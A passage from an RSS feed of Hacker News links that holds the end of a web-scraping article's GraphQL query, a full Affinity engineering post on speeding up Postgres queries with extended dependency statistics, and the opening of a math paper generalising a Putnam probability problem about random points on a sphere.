__typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n posts(after: $postCursor, visible_on_homepage: $visibleOnHomepage) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n featured_comment {</span><span>\\</span><span>n id</span><span>\\</span><span>n body: body_text</span><span>\\</span><span>n user {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...UserImageLink</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n pageInfo {</span><span>\\</span><span>n endCursor</span><span>\\</span><span>n hasNextPage</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n pageInfo {</span><span>\\</span><span>n endCursor</span><span>\\</span><span>n hasNextPage</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ad(kind: </span><span>\\</span><span>"</span><span>feed</span><span>\\</span><span>"</span><span>) @include(if: $includePromotedPost) {</span><span>\\</span><span>n ...AdFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n promoted_email_campaign(promoted_type: HOMEPAGE) @include(if: $includePromotedPost) {</span><span>\\</span><span>n id</span><span>\\</span><span>n abTestName</span><span>\\</span><span>n abVariant {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...PromotedEmailAbTestVariantFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PromotedEmailCampaignFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n daily_newsletter {</span><span>\\</span><span>n id</span><span>\\</span><span>n subject</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n viewer {</span><span>\\</span><span>n id</span><span>\\</span><span>n email</span><span>\\</span><span>n has_newsletter_subscription</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ph_homepage_og_image_url</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment FeedCards on Card {</span><span>\\</span><span>n ...NewPostsCard</span><span>\\</span><span>n ...BestProductsFromLastWeekCard</span><span>\\</span><span>n ...MakersDiscussionCardFragment</span><span>\\</span><span>n ...GoldenKittyCardFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment NewPostsCard on NewPostsCard {</span><span>\\</span><span>n is_dismissed</span><span>\\</span><span>n kind</span><span>\\</span><span>n posts {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostItemList on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...PostItem</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostItem on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n _id</span><span>\\</span><span>n comments_count</span><span>\\</span><span>n name</span><span>\\</span><span>n shortened_url</span><span>\\</span><span>n slug</span><span>\\</span><span>n tagline</span><span>\\</span><span>n updated_at</span><span>\\</span><span>n topics {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n slug</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PostThumbnail</span><span>\\</span><span>n ...PostVoteButton</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostThumbnail on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n thumbnail {</span><span>\\</span><span>n id</span><span>\\</span><span>n media_type</span><span>\\</span><span>n ...MediaThumbnail</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PostStatusIcons</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment MediaThumbnail on Media {</span><span>\\</span><span>n id</span><span>\\</span><span>n image_uuid</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostStatusIcons on Post {</span><span>\\</span><span>n name</span><span>\\</span><span>n product_state</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostVoteButton on Post {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n featured_at</span><span>\\</span><span>n updated_at</span><span>\\</span><span>n created_at</span><span>\\</span><span>n disabled_when_scheduled</span><span>\\</span><span>n has_voted</span><span>\\</span><span>n ... on Votable {</span><span>\\</span><span>n id</span><span>\\</span><span>n votes_count</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment BestProductsFromLastWeekCard on BestProductsFromLastWeekCard {</span><span>\\</span><span>n posts {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment MakersDiscussionCardFragment on MakersDiscussionCard {</span><span>\\</span><span>n isDismissed</span><span>\\</span><span>n discussion {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n ...DiscussionThreadListItem</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment DiscussionThreadListItem on DiscussionThread {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n title</span><span>\\</span><span>n description</span><span>\\</span><span>n descriptionHtml</span><span>\\</span><span>n slug</span><span>\\</span><span>n commentsCount</span><span>\\</span><span>n can_comment: canComment</span><span>\\</span><span>n discussionPath</span><span>\\</span><span>n canEdit</span><span>\\</span><span>n votesCount</span><span>\\</span><span>n hasVoted</span><span>\\</span><span>n createdAt</span><span>\\</span><span>n poll {</span><span>\\</span><span>n ...PollFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n user {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n username</span><span>\\</span><span>n headline</span><span>\\</span><span>n avatar</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PollFragment on Poll {</span><span>\\</span><span>n id</span><span>\\</span><span>n answersCount</span><span>\\</span><span>n hasAnswered</span><span>\\</span><span>n options {</span><span>\\</span><span>n id</span><span>\\</span><span>n text</span><span>\\</span><span>n imageUuid</span><span>\\</span><span>n answersCount</span><span>\\</span><span>n answersPercent</span><span>\\</span><span>n hasAnswered</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment GoldenKittyCardFragment on GoldenKittyCard {</span><span>\\</span><span>n is_dismissed</span><span>\\</span><span>n category_for_voting {</span><span>\\</span><span>n id</span><span>\\</span><span>n slug</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n …</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.scrapingbee.com/blog/charles-proxy/">https://www.scrapingbee.com/blog/charles-proxy/</a></em></p>]]>
            </description>
            <link>https://www.scrapingbee.com/blog/charles-proxy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070934</guid>
            <pubDate>Thu, 12 Nov 2020 15:34:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3000x speedup using Postgres extended statistics]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070742">thread link</a>) | @vishesh92
<br/>
November 12, 2020 | https://build.affinity.co/how-we-used-postgres-extended-statistics-to-achieve-a-3000x-speedup-ea93d3dcdc61?source=collection_home---4------2----------------------- | <a href="https://web.archive.org/web/*/https://build.affinity.co/how-we-used-postgres-extended-statistics-to-achieve-a-3000x-speedup-ea93d3dcdc61?source=collection_home---4------2-----------------------">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@jaredrulison?source=post_page-----ea93d3dcdc61--------------------------------" rel="noopener"><img alt="Jared Rulison" src="https://miro.medium.com/fit/c/96/96/0*3FU0njiCnLnXkMYC.jpg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3056/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg" width="1528" height="840" srcset="https://miro.medium.com/max/552/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 276w, https://miro.medium.com/max/1104/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 552w, https://miro.medium.com/max/1280/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 640w, https://miro.medium.com/max/1400/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg?q=20"></p></div></div></div><figcaption>Go on. Guess.</figcaption></figure><p id="add9">Much like the DMV, the PostgreSQL query planner is a powerful, mysterious entity to whom we semi-blindly entrust our well-being. It has the crucial responsibility of picking the most efficient execution plan for every query. Here we’ll explore what data Postgres takes into account when creating query plans, and how we used that context to help the query planner come up with more efficient plans for some of our most important query patterns.</p><p id="2dce">Here’s an example slow query issued from our web server, along with the inefficient query plan that Postgres chose. Can you spot the key mistake the query planner made?</p><figure><div></div></figure><p id="3e61">By far the most expensive step is the second Nested Loop Join:</p><p id="26ca"><code>Nested Loop Semi Join (cost=1.01..25.07 rows=1 width=4) (actual time=0.079..122074.806 rows=1958 loops=1)</code>.</p><p id="2594">Postgres estimated that this step would return about 1 row, which was a wild underestimate — it actually returned 1958 rows and took about 122 seconds. (See <a href="https://thoughtbot.com/blog/reading-an-explain-analyze-query-plan" rel="noopener">here</a> for more background on how to interpret Postgres query plans.)</p><p id="418b">Through informed use of Postgres statistics, we brought the time for this query down<strong> from 2 minutes to 42 milliseconds — </strong>almost a 3000x speedup! Before we dive into the stats adjustments that we made, let’s make sure we understand how the Postgres planner works.</p><h2 id="b700">Basic Statistics</h2><p id="2225">Statistics are data collected by Postgres used to inform its selection of query plans. Out of the box, Postgres samples the possible values for each column of each table to create histograms and a list of the most common values (among other things). These are used to estimate how many rows will result from applying some set of filters to a table.</p><p id="e362">For larger tables, the planner can’t keep track of every single value a column holds. Instead, it samples the values of each column and uses those to make estimations. We can tweak how much sampling Postgres does for each column on each table with</p><p id="db5b"><code>ALTER TABLE table ALTER column SET STATISTICS {-1 ..10000}</code></p><p id="6e31">where -1 sets it to the default value of 100 (<a href="https://www.postgresql.org/docs/12/planner-stats.html" rel="noopener">docs</a>). This number sets how many buckets are used in the histogram and how many of the most common values are stored.</p><p id="9134">The downsides to increasing the statistics for a column are that more data must be stored in <code>pg_statistic</code> and running <code>ANALYZE</code> on the column's table takes longer.</p><p id="7f91">More details can be found in <a href="https://www.postgresql.org/docs/12/row-estimation-examples.html" rel="noopener">the Postgres docs</a>.</p><h2 id="b5e8">Extended Statistics</h2><p id="8726">Extended statistics are user-defined objects that tell Postgres to collect certain kinds of data for sets of columns, rather than individual columns.</p><p id="e580">Without extended statistics, Postgres estimates the impact of filters on a table by considering each filter independently. For example, consider a database containing 10 Artist records, each of which has 10 Album records referencing it, each of which has 10 Songs referencing that. This totals to 10 Artists, 100 Albums, and 1,000 Songs. Now, consider running the following query:</p><p id="07b3"><code>SELECT * FROM songs WHERE (artists_id = 1 and album_id = 1);</code></p><p id="a3e9">With perfect sampling, the query plan might look like</p><pre><span id="552c">Index Scan using songs_artists_id_album_id_index on songs  (cost=0.28..6.05 rows=1 width=159) (actual time=5.555..5.562 rows=10 loops=1)<br>   Index Cond: ((artists_id = 1) AND (album_id = 1))<br> Planning Time: 311.482 ms<br> Execution Time: 9.266 ms<br>(4 rows)</span></pre><p id="c78c"><code>(cost=0.28..6.05 rows=1 width=159)</code> refers to the planner's estimations while <code>(actual time=5.555..5.562 rows=10 loops=1)</code> refers to the actual results of the executing the plan. The planner estimated 1 row would be returned, but there were actually 10.</p><p id="c03a">The planner calculated its row estimate by first taking the total number of Songs (1000), then considering the <code>artists_id</code> filter. 10% of Songs have <code>artists_id = 1</code> so that leaves 100 Songs. Next it considers the <code>album_id</code> filter. 1% of Songs have <code>album_id = 1</code>, so it's left with 1 Song.</p><p id="b69b">The key piece of information Postgres is missing is that <code>artist_id</code> and <code>album_id</code> are strongly correlated. In fact, knowing the <code>album_id</code>uniquely determines the <code>artist_id</code>. Had Postgres known about this, it could have used only the <code>album_id = 1</code> filter in its estimation and come up with the correct result of 10 Songs.</p><p id="a995">This kind of correlation can be indicated to Postgres using a dependency statistic. This statistic stores the frequency with which each column uniquely determines the other column. A dependency statistic on <code>(artist_id, album_id)</code> might yield the following:</p><pre><span id="53d4">CREATE STATISTICS album_id_artist_id_dep_stt (dependencies) ON album_id, artist_id FROM songs;</span><span id="709a">ANALYZE songs;</span><span id="d112">SELECT stxname, stxkeys, stxddependencies<br>  FROM pg_statistic_ext join pg_statistic_ext_data on (oid = stxoid)<br>  WHERE stxname = 'stts';<br> stxname | stxkeys |             stxddependencies             <br>---------+---------+------------------------------------------<br> stts    | 1 5     | {"1 =&gt; 5": 0.1, "5 =&gt; 1": 1.0}<br>(1 row)</span></pre><p id="6cf7">The 1 and 5 under <code>stxkeys</code> and <code>stxddependencies</code> refer to the 1st and 5th columns on the <code>songs</code> table, which are <code>artist_id</code> and <code>album_id</code>, respectively. The value for "1 =&gt; 5" is 0.1 since <code>artist_id</code> determines <code>album_id</code> 10% of the time. The value for "5 =&gt; 1" is 1.0 since <code>album_id</code> always determines <code>artist_id</code>. When Postgres is filtering by columns with a matching dependency statistic, it’s able to use that to make a more accurate estimation.</p><p id="7487">There are, of course, <a href="https://www.postgresql.org/docs/12/planner-stats.html" rel="noopener">other kinds of extended statistics</a> but a dependency statistic makes the most sense for this kind of data distribution.</p><p id="7db1">One caveat of extended statistics is that Postgres only knows to use them when filtering on exactly the columns referenced in the statistic and when filtering using simple equality conditions, e.g. <code>artist_id = 5</code> and not <code>artist_id IN (5, 6)</code> or <code>artist_id &lt; 10</code>.</p><p id="824b">Use of extended statistics can lead to non-intuitive index choices. If a dependency statistic indicates to Postgres that a column filter is redundant, as in the case of <code>artist_id</code>and <code>album_id</code>, it may opt to use an index that only references one of the columns. In the case of <code>songs</code>, it may use an index on only <code>(album_id)</code> instead of an index on <code>(artist_id, album_id)</code> if both are present.</p><h2 id="ec96">Join Strategies</h2><p id="12ff">There are <a href="https://www.postgresql.org/docs/12/planner-optimizer.html" rel="noopener">three options</a> Postgres has for joining tables:</p><ol><li id="299a">Nested Loop Join. Using this join strategy, Postgres loops through each row in the left relation and scans through the right relation for rows that satisfy the join condition, ideally using an index. This is an effective strategy for when there are very few rows in the left relation.</li><li id="c08c">Merge Join. From <a href="https://www.postgresql.org/docs/12/planner-optimizer.html" rel="noopener">the docs</a>: “each relation is sorted on the join attributes before the join starts. Then the two relations are scanned in parallel, and matching rows are combined to form join rows. This kind of join is more attractive because each relation has to be scanned only once. The required sorting might be achieved either by an explicit sort step, or by scanning the relation in the proper order using an index on the join key.”</li><li id="f1e5">Hash Join. From <a href="https://www.postgresql.org/docs/12/planner-optimizer.html" rel="noopener">the docs</a>: “the right relation is first scanned and loaded into a hash table, using its join attributes as hash keys. Next the left relation is scanned and the appropriate values of every row found are used as hash keys to locate the matching rows in the table.”</li></ol><p id="8865">For our purposes, the main thing to note here is that the advantage of a Nested Loop Join is that there’s very little overhead compared to the other join strategies. However, this join can go wrong if there are many rows in the left relation. For example, suppose there are 1,000 rows in the left relation and Postgres is using an index to access the right relation. If each index access takes 4ms, the entire join will take 4s, which is too slow in the context of responding to a user request.</p><p id="c5b5">Now that we understand the different type of joins, let’s revisit the Nested Loop Join that struck us as problematic. Without going into too much detail about our data model at Affinity, all you need to know is that on our tables <code>entity_values</code> and <code>lists_entries</code>, the column <code>org_id</code> is uniquely determined by <code>list_id</code> or <code>entity_attribute_id</code>, meaning that in order to estimate the selectivity of a set of filters on these columns, the filters should not be considered individually. <strong>Our slow queries were the result of Postgres underestimating the number of rows that would result from applying a filter condition and opting to use a nested loop join because of that underestimation.</strong></p><h2 id="4244">Actions Taken</h2><p id="edb4">Let’s look back at our original problem query. By far, the most costly step was looping over the index access to <code>entity_values_org_id_entity_attribute_id_company_id_index</code> a whopping 13,769 times.</p><p id="f8ca">To encourage the planner to use a different join strategy, we needed to improve its estimates for filters on <code>lists_entries</code> and <code>entity_values</code>. Based on the filters applied, we maxed out the per-column statistics for:</p><pre><span id="099f">lists_entries:<br>- org_id<br>- list_id</span><span id="cee2">entity_values:<br>- org_id<br>- entity_attribute_id</span></pre><p id="3c24">among other tables and columns for different query patterns.</p><p id="5f14">We also added dependency statistics on:</p><pre><span id="8495">lists_entries (list_id, org_id)<br>entity_values (entity_attribute_id, org_id)</span></pre><p id="5a2b">among other dependency statistics for other tables and columns, since both <code>list_id</code> and <code>entity_attribute_id</code> uniquely determine the <code>org_id</code>.</p><p id="c28c">After we made these adjustments, Postgres chose the following query plan for our original query:</p><figure><div></div></figure><p id="3a3d">Here, the estimates are much more accurate and the planner opted for a hash join for the inner join — and the query took 42 milliseconds instead of the original 2 minutes.</p><p id="54b4">Increasing the per-column statistics and adding dependency statistics have helped tremendously, but there is still progress to be made. As you may have noticed in the improved query plan, the planner underestimates the number of rows resulting from the inner join. While the outer nested loop join didn’t take long this time, it’s not hard to imagine a query where the inner join results in many rows and the outer join becomes a bottleneck.</p><p id="f2fd">We hope this post has given you some ideas about how to improve your query plans, or at the very least taught you something about the magic of Postgres!</p></div></div></section></div></div>]]>
            </description>
            <link>https://build.affinity.co/how-we-used-postgres-extended-statistics-to-achieve-a-3000x-speedup-ea93d3dcdc61?source=collection_home---4------2-----------------------</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070742</guid>
            <pubDate>Thu, 12 Nov 2020 15:17:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Capturing the Origin with Random Points: Generalizations of a Putnam Problem]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070681">thread link</a>) | @Flamingo94
<br/>
November 12, 2020 | https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm | <a href="https://web.archive.org/web/*/https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><center>
<p>
<i>College Mathematics Journal</i>, <b>27</b> (1996) no. 3,
186-192.
</p>
<p>
<p>Copyright<br><b><i>The Mathematical Association of
America</i></b></p>
</p>
</center>
<hr>


<p>

<title> Capturing the Origin with Random Points:  Generalizations of a 
Putnam Problem</title>
 
</p>

<center>Ralph Howard <br>
Department of Mathematics <br>
University of South Carolina <br>
Columbia SC 29208 <p>
&nbsp;
and </p><p>
&nbsp;
Paul Sisson <br>
Department of Mathematics <br>
LSU - Shreveport <br>
Shreveport LA 71115
</p></center>
<h2><a name="tth_sEc1">
1</a>&nbsp;&nbsp;Introduction</h2>

<p>
Problem A-6 of the 53<sup>rd</sup> Putnam Competition read as follows:

</p><blockquote>Four points are chosen at random on the surface of a sphere.  What is the 
probability that the center of the sphere lies inside the tetrahedron whose 
vertices are at the four points?  (It is understood that each point is 
independently chosen relative to a uniform distribution on the sphere.)
</blockquote>
<p>
The problem has a geometric immediacy that makes it tantalizing:  the 
tetrahedron so formed is readily visualized and no great mathematical 
background is necessary to understand the question being asked.  Further, it 
is almost impossible to resist the urge to generalize the problem.  Some of 
the variants that spring to mind quickly are:

</p><dl compact="">   <dt><b>(1)</b></dt>
	<dd> Suppose <i>n</i>+1 points are chosen at random from the surface of 
   a ball in  <b><i>R</i></b><sup><i>n</i></sup>.  What is the probability that the center of the 
   ball lies inside the simplex in  <b><i>R</i></b><sup><i>n</i></sup> whose vertices are the <i>n</i>+1 
   points (i.e. the <i>convex hull </i> of the <i>n</i>+1 points)?
   
</dd><dt><b>(2)</b></dt>
	<dd> Four points are chosen at random from <i>within </i> a ball in
    <b><i>R</i></b><sup>3</sup> (or <i>n</i>+1 points from an <i>n</i>-ball in  <b><i>R</i></b><sup><i>n</i></sup>).  What is the
   probability that the center of the ball lies within the convex hull of
   the points?
   
</dd><dt><b>(3)</b></dt>
	<dd> Four points are chosen at random from the surface of some <i>
   other </i> object in  <b><i>R</i></b><sup>3</sup> (or <i>n</i>+1 points from the surface of some
   object in  <b><i>R</i></b><sup><i>n</i></sup>).  What is the probability that a fixed interior point
   of the object lies inside the convex hull of the four (respectively,
   <i>n</i>+1) points?
   
</dd><dt><b>(4)</b></dt>
	<dd> More vaguely, assume the action is centered about the origin 
   in  <b><i>R</i></b><sup><i>n</i></sup>, and that <i>n</i>+1 points are chosen ``at random'' in  <b><i>R</i></b><sup><i>n</i></sup>.  
   What is the probability that the convex hull of the <i>n</i>+1 points 
   contains the origin?
   
</dd></dl>The list can easily be extended, but as question <b>(4)</b> demonstrates we
have already reached the point where the questions need to be more
carefully posed.

<p>
Despite the fact that the original Putnam question is so easily understood,
the solution is (not surprisingly) not arrived at with equal ease.  This
sentiment is supported by the fact that 123 of the top 203 scorers on the
Putnam exam submitted no solution at all to problem A-6, and a relatively
low number of 9 of the top scorers received a full 10 points for the
problem. This difficulty in answering such an easily grasped problem just 
makes it more intriguing, of course, and suggests that the problem and its 
generalizations are worth investigating.  In this paper we will develop a 
surprisingly simple answer to questions <b>(1)</b> and <b>(2)</b>.  In addition, 
our result answers rather general forms of questions <b>(3)</b> and <b>(4)</b>.

</p><p>
In [<a href="#klos" name="CITEklos">3</a>], Klosinski, Alexanderson and Larson offer the following
solution to A-6.  Assume the sphere is centered at the origin, and that
the first point <i>P</i><sub>0</sub> is located at the north pole of the sphere, with the
three remaining points then located at random locations on the sphere.  We
can assume that these remaining points are chosen in a two-step process:
first a diameter <i>P</i><sub><i>i</i>1</sub><i>P</i><sub><i>i</i>2</sub> (<i>i</i> <span face="symbol">Î</span> {1,2,3}) is fixed and then one of
the two end-points {<i>P</i><sub><i>i</i>1</sub>,<i>P</i><sub><i>i</i>2</sub>} is selected as a vertex of the
tetrahedron.  Figure 1 below illustrates a typical orientation of the  
choices.  The eight possible tetrahedra <i>P</i><sub>0</sub><i>P</i><sub>1<i>j</i><sub>1</sub></sub><i>P</i><sub>2<i>j</i><sub>2</sub></sub><i>P</i><sub>3<i>j</i><sub>3</sub></sub>
(with each <i>j</i><sub><i>i</i></sub> being 1 or 2) are equally likely.  Further, we can assume
that the result is an honest tetrahedron and that the origin does not lie 
on any face.  (Recall that the plane through three noncollinear points 
<i>P</i><sub>1</sub>, <i>P</i><sub>2</sub> and <i>P</i><sub>3</sub> consists of all <i>affine combinations </i> 

</p><center><div>
<table><tbody><tr><td nowrap="">
<span face="symbol">a</span><sub>1</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1</span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">a</span><sub>2</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2</span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">a</span><sub>3</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3</span>&nbsp;<br></td><td nowrap="">
,</td></tr></tbody></table>
</div></center>

 
where 
<span face="symbol">a</span><sub>1</sub>+<span face="symbol">a</span><sub>2</sub>+<span face="symbol">a</span><sub>3</sub> = 1.  With probability one, neither the fourth 
vertex nor the origin lies in the plane through any three vertices.)

<center><img src="https://lsusmath.rickmabry.org/psisson/putnam/one.gif" width="300" height="300"></center>
 
<center>Figure 1: Typical choice of vertices.</center>
 
<p>
In particular, the four vertex vectors 

</p><center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
, </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">11</span>&nbsp;<br></td><td nowrap="">
, </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">21</span>&nbsp;<br></td><td nowrap="">
&nbsp;and&nbsp; </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">31</span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>

 
must be linearly dependent, so there exists a 4-tuple
(<i>w</i>,<i>x</i>,<i>y</i>,<i>z</i>) for which 

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br>0</td><td nowrap="">
 = <i>w</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <i>x</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">11</span>&nbsp;<br></td><td nowrap="">
+ <i>y</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">21</span>&nbsp;<br></td><td nowrap="">
+ <i>z</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">31</span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>


and for which <i>w</i>,<i>x</i>,<i>y</i> and <i>z</i> are all non-zero.  Then since 

<center></center>

 
the eight equations

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br>0</td><td nowrap="">
 = <i>w</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <i>x</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1<i>j</i><sub>1</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>y</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2<i>j</i><sub>2</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>z</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3<i>j</i><sub>3</sub></span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>


have the solutions

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<table>
<tbody><tr><td><p nowrap="">
(<i>w</i>,<i>x</i>,<i>y</i>,<i>z</i>),(<i>w</i>,<i>x</i>,<i>y</i>,-<i>z</i>),(<i>w</i>,<i>x</i>,-<i>y</i>,<i>z</i>),(<i>w</i>,-<i>x</i>,<i>y</i>,<i>z</i>),</p></td>
</tr><tr><td><p nowrap="">
(<i>w</i>,<i>x</i>,-<i>y</i>,-<i>z</i>),(<i>w</i>,-<i>x</i>,-<i>y</i>,<i>z</i>),(<i>w</i>,-<i>x</i>,<i>y</i>,-<i>z</i>),(<i>w</i>,-<i>x</i>,-<i>y</i>,-<i>z</i>).</p></td></tr></tbody></table>
</td><td nowrap="">
</td></tr></tbody></table>
</div></center>



<p>
Each point in the tetrahedron with vertices <i>P</i><sub>0</sub>, <i>P</i><sub>1<i>j</i><sub>1</sub></sub>, <i>P</i><sub>2<i>j</i><sub>2</sub></sub>,<i>P</i><sub>3<i>j</i><sub>3</sub></sub> can be uniquely represented as a <i>convex combination </i>

</p><center><div>
<table><tbody><tr><td nowrap="">
<span face="symbol">b</span><sub>0</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">b</span><sub>1</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1<i>j</i><sub>1</sub></span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">b</span><sub>2</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
